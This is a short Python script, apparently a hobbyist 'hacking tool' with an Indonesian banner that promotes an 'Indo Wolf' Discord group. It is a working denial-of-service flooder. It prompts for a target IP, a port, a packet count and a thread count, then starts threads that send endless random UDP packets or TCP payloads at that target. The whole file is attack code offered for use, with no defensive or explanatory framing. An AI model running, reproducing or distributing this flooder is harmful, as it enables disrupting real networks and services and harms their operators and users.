import random
import socket
import threading
import os

os.system("clear")
print       (" - - > William X Zen!!! < - - ")
print       (" - - > Tolls By William!!!! < - - ")
print       (" - - > Join Discord Indo Wolf!!! <- - ")                                   
print       (" - - > Support Indo Wolf !! < - - ")
print       (" - - > Indo Wolf RolePlay  < - - ")
print       (" - - >  Pro Hengker Tzy!! < - - ")
print       (" - - >  Masukin IP sama Port dibawah ini!!!  < - - ")    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Berapa:"))
threads = int(input(" Pelor Tembakin Berapa:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" GASSS!!! ")
		except:
			print("[!] GASSS!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" GASSS!!! ")
		except:
			s.close()
			print("[*] GASSS!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()